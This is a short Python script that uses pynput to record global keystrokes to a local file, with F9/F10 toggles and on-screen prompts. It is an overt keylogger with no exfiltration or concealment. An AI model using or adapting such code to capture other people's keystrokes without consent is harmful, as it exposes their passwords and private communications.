from pynput import keyboard

log_file = "keylog.txt"
logging_enabled = False  # Start with logging OFF

def on_press(key):
    global logging_enabled

    if key == keyboard.Key.f9:
        logging_enabled = True
        print("Logging started.")
        return
    elif key == keyboard.Key.f10:
        logging_enabled = False
        print("Logging stopped.")
        return
    elif key == keyboard.Key.esc:
        # Stop listener completely
        print("Exiting program.")
        return False

    if logging_enabled:
        try:
            with open(log_file, "a") as f:
                f.write(key.char)
        except AttributeError:
            with open(log_file, "a") as f:
                if key == keyboard.Key.space:
                    f.write(" ")
                elif key == keyboard.Key.enter:
                    f.write("\n")
                else:
                    f.write(f"[{key.name}]")

def on_release(key):
    # No action needed here, but function required by listener
    pass

if __name__ == "__main__":
    print("Press F9 to start logging, F10 to stop, Esc to exit.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
